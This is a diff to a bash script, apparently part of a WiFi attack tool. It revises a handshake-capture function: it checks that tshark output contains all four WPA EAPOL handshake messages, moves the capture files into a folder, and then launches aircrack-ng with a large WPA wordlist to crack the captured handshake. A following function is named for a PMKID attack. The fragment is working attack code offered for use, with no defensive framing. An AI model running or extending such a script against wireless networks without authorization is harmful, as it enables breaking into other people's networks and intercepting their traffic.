@@ -146,14 +146,20 @@ function handshake(){
 
     sleep 60 # Listen for 60 seconds
 
-    tshark -r capture_${ap_bssid}-01.cap -Y "eapol"
+    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" > handshake.txt
 
-    if [ "$(echo $?)" == "0" ]; then
+    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
         echo -e "${green}[+]${nc} Handshake captured"
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
     else
         echo -e "${red}[-]${nc} Handshake could not be captured"
         echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
+        tshark -r capture_${ap_bssid}-01.cap -Y "eapol" > handshake.txt
+        if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
+            echo -e "${green}[+]${nc} Handshake captured"
+        else
+            echo -e "${red}[-]${nc} Handshake could not be captured"
+        fi
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
         echo -ne "${yellow}[?]${nc} Do you want to try again? [y/n]: " && read answer
         if [[ $answer == "y" ]]; then
@@ -161,10 +167,12 @@ function handshake(){
         fi
     fi
 
-    xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt capture_${ap_bssid}-01.cap" &
-
+    # rm -rf handshake.txt
     mkdir -p handshakes
     mv capture_* handshakes/
+
+    xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
+
 }
 
 function pmkid(){
